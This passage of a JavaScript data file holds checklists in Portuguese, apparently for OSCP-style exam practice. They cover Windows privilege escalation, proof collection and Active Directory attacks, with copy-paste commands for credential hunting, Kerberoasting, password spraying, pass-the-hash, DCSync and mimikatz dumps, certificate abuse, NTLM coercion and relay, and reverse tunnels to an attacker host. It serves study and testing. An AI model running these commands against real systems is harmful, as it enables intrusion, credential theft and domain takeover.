        hint: "Algumas caps viram privesc direto.",
        cmd: "getcap -r / 2>/dev/null"
      }
    ]
  },

  {
    category: "Windows PrivEsc",
    icon: "ü™ü",
    items: [
      {
        id: "win_run_tools",
        title: "Rodar enum: whoami /all ‚Üí PowerUp ‚Üí WinPEAS",
        hint: "Salve output e revise. Isso geralmente te d√° a trilha.",
        cmds: [
          "whoami /all",
          "systeminfo"
        ]
      },
      {
        id: "win_users_groups",
        title: "Users e grupos locais",
        hint: "Mapeie contexto e poss√≠veis rotas para privil√©gio.",
        cmds: [
          "net users",
          "net user <username>",
          "net localgroup",
          "net localgroup administrators",
          "qwinsta"
        ]
      },
      {
        id: "win_find_creds_fast",
        title: "Hunting r√°pido por credenciais (PowerShell)",
        hint: "Filtre Windows e procure padr√µes comuns em configs/logs/backup.",
        cmd:
"Get-ChildItem -Path C:\\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\\\Windows)' } | Select-String -Pattern \"pwd=\", \"password=\", \"username=\", \"user=\", \"pass=\""
      },
      {
        id: "win_patches",
        title: "Patch level",
        hint: "Ajuda em hip√≥teses, embora OSCP geralmente foque mais em misconfig.",
        cmd: "wmic qfe get Caption,Description,HotFixID,InstalledOn"
      },
      {
        id: "win_netstat_pid",
        title: "Conex√µes e PIDs",
        hint: "Ver servi√ßos e piv√¥s poss√≠veis.",
        cmd: "netstat -ano | findstr /vi UDP"
      },
      {
        id: "win_tasks",
        title: "Scheduled tasks",
        hint: "Tarefas com scripts grav√°veis e paths ruins s√£o bons vetores.",
        cmds: [
          "schtasks",
          "schtasks /query /fo LIST /v"
        ]
      },
      {
        id: "win_services_paths",
        title: "Servi√ßos suspeitos (paths e startmode)",
        hint: "Procure unquoted path, weak ACL, bin√°rio troc√°vel, service misconfig.",
        cmds: [
          "wmic service get name,pathname,startmode,state | findstr /i 'c:' | findstr /i /v \"C:\\\\windows\\\\\"",
          "wmic service get name,pathname,startmode,state | findstr /i \"auto\" | findstr /i /v \"C:\\\\windows\\\\\"",
          "powershell -c \"Get-CimInstance -ClassName win32_service | Select Name,State,PathName\""
        ]
      }
    ]
  },

  {
    category: "Finaliza√ß√£o",
    icon: "‚úÖ",
    items: [
      {
        id: "final_proofs",
        title: "Proofs coletadas",
        hint: "Local e proof. Validar prints e arquivo final. Colete ANTES de qualquer limpeza.",
        cmds: [
          "# Linux:",
          "hostname && whoami && ip a && cat /root/proof.txt",
          "cat /home/*/local.txt 2>/dev/null",
          "cat /root/proof.txt 2>/dev/null",
          "",
          "# Windows:",
          "hostname && whoami && ipconfig",
          "type C:\\Users\\Administrator\\Desktop\\proof.txt",
          "type C:\\Users\\*\\Desktop\\local.txt",
          "",
          "# Screenshot: terminal mostrando hostname + whoami + ip + conte√∫do do proof/local",
          "# Copie o hash para suas notas IMEDIATAMENTE"
        ]
      },
      {
        id: "final_notes",
        title: "Anota√ß√µes reprodut√≠veis",
        hint: "Passo a passo claro, evid√™ncias, comandos exatos e decis√µes.",
        cmds: [
          "# Estrutura m√≠nima para cada m√°quina:",
          "# 1. IP e hostname",
          "# 2. Portas/servi√ßos encontrados (cole output nmap)",
          "# 3. Vulnerabilidade explorada (nome, CVE se aplic√°vel)",
          "# 4. Passos exatos (comandos copi√°veis, payloads, configs)",
          "# 5. Proof: local.txt e/ou proof.txt (hash + screenshot)",
          "# 6. PrivEsc: vetor usado, comando final",
          "",
          "# Dica: mantenha um arquivo por m√°quina no workspace",
          "# Use timestamps para rastrear o que fez e quando"
        ]
      },
      {
        id: "final_checklist_before_submit",
        title: "Checklist antes de submeter",
        hint: "√öltima passada para garantir que n√£o esqueceu nada.",
        cmds: [
          "# Para CADA m√°quina comprometida, confirme:",
          "# [ ] Screenshot com hostname + whoami + ip + proof hash",
          "# [ ] Hash do proof.txt/local.txt copiado nas notas",
          "# [ ] Passos de explora√ß√£o documentados e reprodut√≠veis",
          "# [ ] PrivEsc documentado com comandos exatos",
          "# [ ] Nenhuma ferramenta proibida usada (Metasploit: 1x apenas)",
          "",
          "# Para o relat√≥rio (se aplic√°vel):",
          "# [ ] Executive summary",
          "# [ ] Cada vuln com: descri√ß√£o, impacto, evid√™ncia, remedia√ß√£o",
          "# [ ] Screenshots leg√≠veis e numerados"
        ]
      }
    ]
  }
];


const AD_CHECKLIST = [
  {
    category: "Recon & Baseline",
    icon: "üß≠",
    items: [
      {
        id: "ad_recon_tcp_full",
        title: "Scan completo de todas as portas TCP",
        hint: "Full TCP primeiro, depois refine com -sV/-sC nas portas encontradas. Salve outputs.",
        cmds: [
          "nmap -p- -Pn {ip} -v --min-rate 1000 --max-rtt-timeout 1000ms -oN nmap_ports.txt",
          "nmap -Pn -sC -sV -p {port} {ip} -oN nmap_detail.txt"
        ]
      },
      {
        id: "ad_recon_udp_top",
        title: "Checar UDP (top ports) quando fizer sentido",
        hint: "DNS (53), Kerberos (88), SNMP (161), LDAP (389) podem aparecer. Use top ports e ajuste se descobrir algo.",
        cmd: "sudo nmap -sU --top-ports 200 -T4 {ip} -oN nmap_udp_top.txt"
      },
      {
        id: "ad_baseline_dc_domain",
        title: "Confirmar dom√≠nio, DC, DNS e clock",
        hint: "Dom√≠nio e DC IP corretos. Ajuste /etc/hosts se precisar. Em Kerberos, clock desalinhado quebra tudo.",
        cmds: [
          "nmap -p 445 --script smb-os-discovery {ip}",
          "sudo ntpdate -u {ip} 2>/dev/null || true",
          "date",
          "sudo sh -c 'echo \"{ip} {dc_host} {domain}\" >> /etc/hosts'",
          "cat /etc/resolv.conf"
        ]
      },
      {
        id: "ad_baseline_dns_resolve",
        title: "Validar resolu√ß√£o DNS do dom√≠nio e DC",
        hint: "Confirme que o dom√≠nio resolve corretamente. Se n√£o, ajuste /etc/resolv.conf ou /etc/hosts.",
        cmds: [
          "dig @{ip} {domain} ANY",
          "dig +short {domain}",
          "dig +short _kerberos._tcp.{domain} SRV",
          "dig +short _ldap._tcp.dc._msdcs.{domain} SRV",
          "nslookup {domain} {ip}"
        ]
      }
    ]
  },

  {
    category: "Enum sem credenciais",
    icon: "üïµÔ∏è",
    items: [
      {
        id: "ad_anon_smb_ldap_rpc",
        title: "Testar SMB, LDAP e RPC com acesso an√¥nimo",
        hint: "Ver se aceita null session, bind an√¥nimo e enum b√°sica. Checar shares p√∫blicos.",
        cmds: [
          "netexec smb {ip} -u '' -p ''",
          "netexec smb {ip} -u 'guest' -p ''",
          "smbclient -L //{ip}/ -N",
          "rpcclient -U '' -N {ip} -c 'enumdomusers'",
          "rpcclient -U '' -N {ip} -c 'enumdomgroups'",
          "ldapsearch -x -H ldap://{ip} -s base namingcontexts",
          "ldapsearch -x -H ldap://{ip} -b '' -s base '(objectclass=*)'"
        ]
      },
      {
        id: "ad_enum_shares_anon",
        title: "Enumerar shares an√¥nimos e permiss√µes",
        hint: "Se tiver leitura, procure: backups, scripts, GPP, arquivos com credenciais, chaves, configs.",
        cmds: [
          "netexec smb {ip} --shares -u '' -p ''",
          "netexec smb {ip} --shares -u 'guest' -p ''",
          "smbmap -H {ip} -u '' -p ''",
          "smbmap -H {ip} -u 'guest' -p '' -R"
        ]
      },
      {
        id: "ad_userlist_rid_brute",
        title: "Gerar lista de usu√°rios por RID brute / lookupsid",
        hint: "Op√ß√µes: netexec/crackmapexec rid-brute, impacket-lookupsid, rpcclient enumdomusers.",
        cmds: [
          "netexec smb {ip} -u '' -p '' --rid-brute 5000 | tee ridbrute.txt",
          "impacket-lookupsid {domain}/''@{ip} 20000 2>/dev/null | tee lookupsid.txt",
          "rpcclient -U '' -N {ip} -c 'enumdomusers' | tee rpc_users.txt",
          "cat ridbrute.txt | grep SidTypeUser | awk -F'\\\\\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt",
          "cat lookupsid.txt | grep SidTypeUser | awk -F'\\\\\\' '{print $2}' | awk '{print $1}' | sort -u >> users.txt",
          "sort -u users.txt -o users.txt && wc -l users.txt"
        ]
      },
      {
        id: "ad_userlist_kerbrute_userenum",
        title: "Validar usu√°rios com kerbrute (userenum)",
        hint: "Se tiver lista, valide quem existe de verdade. Ajuda em ASREPRoast e spray.",
        cmd: "kerbrute userenum --dc {ip} -d {domain} users.txt | tee kerbrute_users.txt"
      },
      {
        id: "ad_enum4linux_ng",
        title: "Rodar enum4linux-ng (e opcionalmente enum4linux cl√°ssico)",
        hint: "Pode achar pol√≠ticas, dom√≠nio, usu√°rios, shares e mais. √Äs vezes um encontra coisa que o outro n√£o.",
        cmds: [
          "enum4linux-ng -A {ip} | tee enum4linux_ng.txt",
          "enum4linux -a {ip} | tee enum4linux.txt"
        ]
      },
      {
        id: "ad_smb_signing_check",
        title: "Checar SMB signing (relevante para relay)",
        hint: "Se SMB signing estiver desabilitado, relay √© poss√≠vel.",
        cmds: [
          "netexec smb {ip} --gen-relay-list relay_targets.txt",
          "nmap -p 445 --script smb2-security-mode {ip}"
        ]
      },
      {
        id: "ad_password_policy",
        title: "Obter pol√≠tica de senha do dom√≠nio (lockout, complexidade)",
        hint: "Antes de spray, saiba o lockout threshold e duration para n√£o travar contas.",
        cmds: [
          "netexec smb {ip} -u '' -p '' --pass-pol",
          "netexec smb {ip} -u 'guest' -p '' --pass-pol",
          "rpcclient -U '' -N {ip} -c 'getdompwinfo'"
        ]
      }
    ]
  },

  {
    category: "Kerberos Attacks",
    icon: "üé´",
    items: [
      {
        id: "ad_asreproast",
        title: "ASREPRoast com lista de usu√°rios",
        hint: "Ap√≥s ter usernames v√°lidos. Se conseguir hashes AS-REP, tentar crack offline.",
        cmds: [
          "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile users.txt -no-pass -outputfile asrep.hashes",
          "netexec ldap {ip} -u users.txt -p '' --asreproast asrep_nxc.hashes",
          "hashcat -m 18200 asrep.hashes {wordlist} --force",
          "john --wordlist={wordlist} asrep.hashes"
        ]
      },
      {
        id: "ad_kerberoast",
        title: "Kerberoast quando tiver user+senha",
        hint: "Com cred v√°lida, enumerar SPNs e solicitar tickets. Crack offline e reutilizar credenciais.",
        cmds: [
          "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request -outputfile kerberoast.hashes",
          "netexec ldap {ip} -u {user} -p \"{pass}\" --kerberoasting kerberoast_nxc.hashes",
          "hashcat -m 13100 kerberoast.hashes {wordlist} --force",
          "john --wordlist={wordlist} kerberoast.hashes"
        ]
      },
      {
        id: "ad_targeted_kerberoast",
        title: "Targeted Kerberoast (se tiver GenericAll/GenericWrite sobre user)",
        hint: "Se BH mostrar GenericAll/Write sobre uma conta, voc√™ pode setar um SPN e kerberoastar ela.",
        cmds: [
          "# Se tiver GenericAll/GenericWrite sobre o user alvo:",
          "# 1. Setar SPN no target (via PowerView ou targetedKerberoast)",
          "targetedKerberoast.py -d {domain} -u {user} -p \"{pass}\" --dc-ip {ip}",
          "# 2. Solicitar ticket e crack"
        ]
      }
    ]
  },

  {
    category: "Password Spraying",
    icon: "üîê",
    items: [
      {
        id: "ad_spray_smb",
        title: "Password spray via SMB (controlado)",
        hint: "Teste 1 senha contra todos os users. Respeite lockout policy. Espere entre tentativas.",
        cmds: [
          "netexec smb {ip} -u users.txt -p \"{pass}\" --continue-on-success | tee spray_smb.txt",
          "netexec smb {ip} -u users.txt -p \"{pass}\" --no-bruteforce --continue-on-success"
        ]
      },
      {
        id: "ad_spray_kerbrute",
        title: "Password spray via Kerberos (mais silencioso)",
        hint: "Kerbrute faz spray via Kerberos, gera menos ru√≠do que SMB.",
        cmd: "kerbrute passwordspray --dc {ip} -d {domain} users.txt \"{pass}\" | tee spray_kerb.txt"
      },
      {
        id: "ad_spray_common_passwords",
        title: "Senhas comuns para spray (lista mental)",
        hint: "Tente varia√ß√µes sazonais: Season+Year!, Company+123, Welcome1, Password1, etc.",
        cmds: [
          "# Senhas comuns para spray AD:",
          "# Password1, Password123, Welcome1, Welcome123",
          "# Company2024!, Season2024! (ex: Winter2024!, Summer2024!)",
          "# <domain_name>123, <company_name>1",
          "# Lembre: 1 senha por vez, respeite lockout"
        ]
      }
    ]
  },

  {
    category: "Credenciais: valida√ß√£o e reuso",
    icon: "üîë",
    items: [
      {
        id: "ad_auth_matrix",
        title: "Testar credencial em m√∫ltiplos protocolos",
        hint: "Sempre que pegar user/senha ou hash: validar SMB, WinRM, RDP, LDAP, RPC, MSSQL e afins.",
        cmds: [
          "netexec smb {ip} -u {user} -p \"{pass}\"",
          "netexec winrm {ip} -u {user} -p \"{pass}\"",
          "netexec rdp {ip} -u {user} -p \"{pass}\"",
          "netexec ldap {ip} -u {user} -p \"{pass}\"",
          "netexec mssql {ip} -u {user} -p \"{pass}\"",
          "netexec ssh {ip} -u {user} -p \"{pass}\""
        ]
      },
      {
        id: "ad_auth_pth",
        title: "Pass-the-Hash (quando tiver NTLM hash)",
        hint: "Use o hash NTLM direto. Funciona em SMB, WinRM, psexec, wmiexec.",
        cmds: [
          "netexec smb {ip} -u {user} -H {nthash}",
          "netexec winrm {ip} -u {user} -H {nthash}",
          "evil-winrm -i {ip} -u {user} -H {nthash}",
          "psexec.py {domain}/{user}@{ip} -hashes :{nthash}",
          "wmiexec.py {domain}/{user}@{ip} -hashes :{nthash}"
        ]
      },
      {
        id: "ad_shares_per_user",
        title: "Rechecar shares para cada novo usu√°rio",
        hint: "Cada nova cred pode abrir share novo. Refa√ßa enum de shares e permiss√µes.",
        cmds: [
          "netexec smb {ip} --shares -u {user} -p \"{pass}\"",
          "smbmap -H {ip} -u {user} -p \"{pass}\" -R",
          "smbclient -L //{ip}/ -U \"{user}%{pass}\""
        ]
      },
      {
        id: "ad_spray_protocols",
        title: "Bruteforce/spray controlado em protocolos relevantes",
        hint: "Respeite lockout policy. Prefira spray (1 senha em muitos users). Lembrar de NTLM quando aplic√°vel.",
        cmds: [
          "netexec smb {ip} -u users.txt -p \"{pass}\" --continue-on-success",
          "kerbrute passwordspray --dc {ip} -d {domain} users.txt \"{pass}\""
        ]
      }
    ]
  },

  {
    category: "LDAP Enum (com credenciais)",
    icon: "üìö",
    items: [
      {
        id: "ad_ldap_full_enum",
        title: "LDAP enum completa com credenciais",
        hint: "Com cred, puxe users, groups, computers, GPOs, OUs e mais.",
        cmds: [
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(objectClass=user)' sAMAccountName memberOf | tee ldap_users.txt",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(objectClass=group)' cn member | tee ldap_groups.txt",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(objectClass=computer)' cn dNSHostName | tee ldap_computers.txt"
        ]
      },
      {
        id: "ad_ldap_find_interesting",
        title: "Buscar objetos interessantes via LDAP",
        hint: "Contas com delegation, SPNs, AdminCount, descri√ß√µes com senhas.",
        cmds: [
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(adminCount=1)' sAMAccountName",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(description=*)' sAMAccountName description | grep -i 'pass\\|pwd\\|cred\\|key'"
        ]
      }
    ]
  },

  {
    category: "BloodHound & caminhos de ataque",
    icon: "üß†",
    items: [
      {
        id: "ad_bh_collect",
        title: "Coletar BloodHound (quando tiver cred) e analisar paths",
        hint: "Procurar: caminhos de ACL/GPO, roasting, sess√µes, DCSync, delegations e trusts.",
        cmds: [
          "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All",
          "# Alternativa no host Windows:",
          "# SharpHound.exe -c All --zipfilename bh_collection.zip",
          "# Upload os .json no BloodHound GUI e analise"
        ]
      },
      {
        id: "ad_bh_queries_priority",
        title: "Queries priorit√°rias no BloodHound",
        hint: "Comece pelas rotas mais curtas e mais comuns.",
        cmds: [
          "# Queries essenciais (rode no BloodHound GUI):",
          "# 1. Shortest Paths to Domain Admins from Owned",
          "# 2. Find Kerberoastable Users with path to DA",
          "# 3. Find AS-REP Roastable Users",
          "# 4. Users with DCSync Rights",
          "# 5. Shortest Paths to Unconstrained Delegation Systems",
          "# 6. Find principals with GenericAll/WriteDACL/WriteOwner",
          "# 7. GPO abuse candidates",
          "# 8. Sessions de Domain Admins em hosts comprometidos"
        ]
      },
      {
        id: "ad_dcsync_check",
        title: "Checar possibilidade de DCSync",
        hint: "Se algum principal tem direito de replica√ß√£o. Se tiver, √© rota direta para dom√≠nio.",
        cmds: [
          "# Se BH mostrar DCSync rights, ou se tiver DA/Enterprise Admin:",
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip} -just-dc -outputfile dcsync_dump",
          "# Apenas NTLM hashes (mais r√°pido):",
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip} -just-dc-ntlm -outputfile dcsync_ntlm",
          "# Com hash ao inv√©s de senha:",
          "secretsdump.py {domain}/{user}@{ip} -hashes :{nthash} -just-dc-ntlm"
        ]
      },
      {
        id: "ad_acl_abuse",
        title: "Abusar de ACLs fracas (GenericAll, WriteDACL, WriteOwner, etc.)",
        hint: "BH mostra. GenericAll sobre user = reset senha. WriteDACL = adicionar DCSync. WriteOwner = tomar ownership.",
        cmds: [
          "# GenericAll sobre user ‚Üí for√ßar password change:",
          "net rpc password {target_user} '{new_pass}' -U {domain}/{user}%'{pass}' -S {ip}",
          "# WriteDACL ‚Üí adicionar DCSync rights ao seu user:",
          "# Use PowerView: Add-DomainObjectAcl -TargetIdentity 'DC={dc1},DC={dc2}' -PrincipalIdentity {user} -Rights DCSync",
          "# WriteOwner ‚Üí tomar ownership e depois WriteDACL:",
          "# Use owneredit.py ou PowerView"
        ]
      }
    ]
  },

  {
    category: "AD CS (Certificados)",
    icon: "üìú",
    items: [
      {
        id: "adcs_certipy_find",
        title: "Enumerar AD CS e templates vulner√°veis (Certipy find)",
        hint: "Procurar templates vulner√°veis e misconfigs (ESC1-ESC8). Se tiver, pode virar dom√≠nio.",
        cmds: [
          "certipy find -u {user}@{domain} -p \"{pass}\" -dc-ip {ip} -vulnerable -enabled -stdout | tee certipy_find.txt",
          "# Checar output por ESC1, ESC2, ESC3, ESC4, ESC6, ESC8 etc."
        ]
      },
      {
        id: "adcs_certipy_exploit",
        title: "Explorar template vulner√°vel (Certipy req + auth)",
        hint: "ESC1 √© o mais comum: request cert impersonating admin, depois auth com o cert.",
        cmds: [
          "# ESC1 - Request cert como outro user (ex: administrator):",
          "certipy req -u {user}@{domain} -p \"{pass}\" -dc-ip {ip} -template {template_name} -upn administrator@{domain} -ca {ca_name}",
          "# Auth com o .pfx obtido:",
          "certipy auth -pfx administrator.pfx -dc-ip {ip}",
          "# O output d√° o NTLM hash do admin. Use para PtH."
        ]
      },
      {
        id: "adcs_coerce_relay",
        title: "AD CS + coer√ß√£o (ESC8 / PetitPotam + relay)",
        hint: "Se HTTP enrollment estiver habilitado, pode relayar auth coerced para pedir cert.",
        cmds: [
          "# 1. Subir relay para AD CS web enrollment:",
          "ntlmrelayx.py -t http://{ca_ip}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
          "# 2. Coerce DC a autenticar no seu relay:",
          "PetitPotam.py {lhost} {ip}",
          "# 3. Use o cert obtido para auth"
        ]
      }
    ]
  },

  {
    category: "Captura e relay de hashes",
    icon: "ü™§",
    items: [
      {
        id: "ad_responder_early",
        title: "Subir Responder para captura (LLMNR/NBT-NS/mDNS)",
        hint: "Especialmente se existir share grav√°vel, LLMNR/NBT-NS ativo ou cen√°rio de coer√ß√£o.",
        cmds: [
          "sudo responder -I {iface} -dwv",
          "# Hashes capturados ficam em /usr/share/responder/logs/",
          "# Crack NTLMv2 offline:",
          "hashcat -m 5600 captured_hash.txt {wordlist} --force"
        ]
      },
      {
        id: "ad_writable_share_responder_path",
        title: "Plantar arquivo em share grav√°vel para capturar hashes",
        hint: "Share grav√°vel pode virar caminho para coer√ß√£o via .url, .lnk, .scf, desktop.ini.",
        cmds: [
          "# Criar arquivo .url que for√ßa autentica√ß√£o:",
          "# Conte√∫do do arquivo pwn.url:",
          "# [InternetShortcut]",
          "# URL=anything",
          "# WorkingDirectory=anything",
          "# IconFile=\\\\{lhost}\\\\share\\\\icon.ico",
          "",
          "# Criar .scf (mais silencioso):",
          "# [Shell]",
          "# Command=2",
          "# IconFile=\\\\{lhost}\\\\share\\\\icon.ico",
          "# [Taskbar]",
          "# Command=ToggleDesktop",
          "",
          "# Subir no share grav√°vel e esperar Responder capturar"
        ]
      },
      {
        id: "ad_ntlm_relay",
        title: "NTLM Relay (quando SMB signing estiver desabilitado)",
        hint: "Relay auth capturada para executar em outro host sem signing.",
        cmds: [
          "# 1. Gerar lista de targets sem signing:",
          "netexec smb {ip}/24 --gen-relay-list relay_targets.txt",
          "# 2. Subir relay:",
          "ntlmrelayx.py -tf relay_targets.txt -smb2support",
          "# 3. Trigger auth (Responder, coer√ß√£o, .scf, etc.)"
        ]
      },
      {
        id: "ad_coercion_tools",
        title: "Coer√ß√£o de autentica√ß√£o (PetitPotam, PrinterBug, etc.)",
        hint: "For√ßar DC ou outro host a autenticar no seu Responder/relay.",
        cmds: [
          "# PetitPotam (unauthenticated se n√£o patcheado):",
          "PetitPotam.py {lhost} {ip}",
          "# PetitPotam com cred:",
          "PetitPotam.py -u {user} -p \"{pass}\" -d {domain} {lhost} {ip}",
          "# PrinterBug / SpoolSample:",
          "# printerbug.py {domain}/{user}:\"{pass}\"@{ip} {lhost}",
          "# DFSCoerce:",
          "# dfscoerce.py -u {user} -p \"{pass}\" -d {domain} {lhost} {ip}"
        ]
      }
    ]
  },

  {
    category: "Delegation Attacks",
    icon: "üé≠",
    items: [
      {
        id: "ad_unconstrained_deleg",
        title: "Unconstrained Delegation",
        hint: "Se um host tem unconstrained delegation, qualquer TGT que chegar nele fica em mem√≥ria. Combine com coer√ß√£o.",
        cmds: [
          "# Encontrar hosts com unconstrained delegation:",
          "# BH query: 'Find Computers with Unconstrained Delegation'",
          "# Ou via LDAP:",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName dNSHostName",
          "# Se tiver shell no host, extraia TGTs com Rubeus ou mimikatz"
        ]
      },
      {
        id: "ad_constrained_deleg",
        title: "Constrained Delegation (S4U)",
        hint: "Se uma conta tem constrained delegation para um servi√ßo, voc√™ pode impersonar qualquer user naquele servi√ßo.",
        cmds: [
          "# Encontrar contas com constrained delegation:",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w '{pass}' -b 'DC={dc1},DC={dc2}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo",
          "# Explorar com getST.py (S4U2Self + S4U2Proxy):",
          "getST.py -spn {target_spn} -impersonate administrator {domain}/{user}:\"{pass}\" -dc-ip {ip}",
          "export KRB5CCNAME=administrator.ccache",
          "# Use o ticket para acessar o servi√ßo alvo"
        ]
      },
      {
        id: "ad_rbcd",
        title: "Resource-Based Constrained Delegation (RBCD)",
        hint: "Se tiver GenericAll/GenericWrite sobre um computer object, pode configurar RBCD.",
        cmds: [
          "# 1. Criar machine account (se MAQ > 0):",
          "addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' -dc-ip {ip} {domain}/{user}:\"{pass}\"",
          "# 2. Configurar RBCD no alvo:",
          "rbcd.py -delegate-to '{target_computer}$' -delegate-from 'EVIL$' -action write -dc-ip {ip} {domain}/{user}:\"{pass}\"",
          "# 3. Obter ticket impersonando admin:",
          "getST.py -spn cifs/{target_computer}.{domain} -impersonate administrator -dc-ip {ip} {domain}/'EVIL$':'EvilPass123!'",
          "export KRB5CCNAME=administrator.ccache",
          "secretsdump.py -k -no-pass {target_computer}.{domain}"
        ]
      }
    ]
  },

  {
    category: "P√≥s-explora√ß√£o e movimento lateral",
    icon: "üß®",
    items: [
      {
        id: "ad_post_shell_privesc",
        title: "Se obtiver shell: privesc + ca√ßa a credenciais",
        hint: "No host: configs, tokens, chaves, credenciais salvas, DPAPI, scripts, shares mapeados.",
        cmds: [
          "whoami /all",
          "cmdkey /list",
          "powershell -c \"type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"",
          "dir /s /b C:\\Users\\*\\.ssh\\id_rsa 2>nul",
          "reg query HKLM /f password /t REG_SZ /s 2>nul | head -50",
          "findstr /si password *.txt *.ini *.config *.xml *.yml 2>nul"
        ]
      },
      {
        id: "ad_dump_hashes",
        title: "Dump de hashes (secretsdump, mimikatz)",
        hint: "Guardar tudo: hashes e cred sets. Depois crack offline e tente reuso/lateral.",
        cmds: [
          "# Remoto via secretsdump (precisa de admin no host):",
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip}",
          "# Remoto com hash:",
          "secretsdump.py {domain}/{user}@{ip} -hashes :{nthash}",
          "# Local via mimikatz (no host comprometido):",
          "# mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
          "# mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
          "# mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\""
        ]
      },
      {
        id: "ad_lateral_exec",
        title: "Execu√ß√£o remota (psexec, wmiexec, smbexec, evil-winrm)",
        hint: "Validar WinRM, RDP, psexec/wmiexec/smbexec e rpcclient. Cuidado com honeypots.",
        cmds: [
          "psexec.py {domain}/{user}:\"{pass}\"@{ip}",
          "wmiexec.py {domain}/{user}:\"{pass}\"@{ip}",
          "smbexec.py {domain}/{user}:\"{pass}\"@{ip}",
          "evil-winrm -i {ip} -u {user} -p \"{pass}\"",
          "# Com hash:",
          "psexec.py {domain}/{user}@{ip} -hashes :{nthash}",
          "wmiexec.py {domain}/{user}@{ip} -hashes :{nthash}"
        ]
      },
      {
        id: "ad_lateral_rdp",
        title: "RDP com credenciais ou hash",
        hint: "Se RDP estiver aberto e user tem permiss√£o.",
        cmds: [
          "xfreerdp /v:{ip} /u:{domain}\\\\{user} /p:\"{pass}\" /dynamic-resolution /cert:ignore",
          "# Pass-the-Hash via RDP (requer Restricted Admin mode):",
          "xfreerdp /v:{ip} /u:{user} /pth:{nthash} /dynamic-resolution /cert:ignore"
        ]
      }
    ]
  },

  {
    category: "GPO Abuse",
    icon: "üìã",
    items: [
      {
        id: "ad_gpo_enum",
        title: "Enumerar GPOs e permiss√µes",
        hint: "Se tiver write em GPO linkada a OU com users/computers importantes, pode abusar.",
        cmds: [
          "# Via BH: procure GPO abuse paths",
          "# Via netexec/LDAP:",
          "netexec ldap {ip} -u {user} -p \"{pass}\" -M gpp_password",
          "netexec smb {ip} -u {user} -p \"{pass}\" -M gpp_autologin",
          "# Checar SYSVOL por GPP passwords:",
          "smbclient //{ip}/SYSVOL -U \"{user}%{pass}\" -c 'recurse; ls'"
        ]
      },
      {
        id: "ad_gpp_passwords",
        title: "GPP Passwords (cPassword em XML)",
        hint: "MS14-025. Se existir Groups.xml com cPassword, decodifique.",
        cmds: [
          "# Buscar no SYSVOL:",
          "findstr /S /I cpassword \\\\{ip}\\\\SYSVOL\\\\{domain}\\\\Policies\\\\*.xml 2>nul",
          "# Decrypt com gpp-decrypt:",
          "gpp-decrypt {cpassword_value}",
          "# Ou via netexec modulo:",
          "netexec smb {ip} -u {user} -p \"{pass}\" -M gpp_password"
        ]
      }
    ]
  },

  {
    category: "Pivoting & rede interna",
    icon: "üï≥Ô∏è",
    items: [
      {
        id: "ad_check_extra_nics",
        title: "Checar adaptadores de rede adicionais (pivot)",
        hint: "Se houver outra rede, montar pivot (chisel/ligolo/ssh) e rodar ferramentas via jumpbox.",
        cmds: [
          "ipconfig /all",
          "route print",
          "arp -a"
        ]
      },
      {
        id: "ad_port_forward_need",
        title: "Checar portas locais/listening para port-forward",
        hint: "Servi√ßos locais podem ser o caminho (DB interno, admin panel, etc.). Port-forward ajuda muito.",
        cmds: [
          "netstat -ano | findstr LISTEN",
          "# Chisel reverse SOCKS (via host comprometido):",
          "# Attacker: chisel server --reverse -p {lport}",
          "# Victim:   chisel client {lhost}:{lport} R:socks",
          "# Depois use proxychains para ferramentas",
          "# Ligolo-ng (tunneling TUN):",
          "# Attacker: sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}",
          "# Victim:   ./agent -connect {lhost}:{lport} -ignore-cert"
        ]
      },
      {
        id: "ad_internal_scan",
        title: "Scan de rede interna ap√≥s pivot",
        hint: "Ap√≥s montar tunnel, scan range interno para achar novos hosts.",
        cmds: [
          "# Via proxychains (SOCKS):",
          "proxychains -q nmap -sT -Pn -p 22,80,135,139,445,3389,5985 {internal_range}",
          "# Ou via netexec pelo tunnel:",
          "proxychains -q netexec smb {internal_range} --gen-relay-list internal_relay.txt"
        ]
      }
    ]
  },

  {
    category: "Windows PrivEsc (quando cair em host Windows)",
    icon: "ü™ü",
    items: [
      {
        id: "winpe_whoami_all",
        title: "Rodar whoami /all e salvar output",
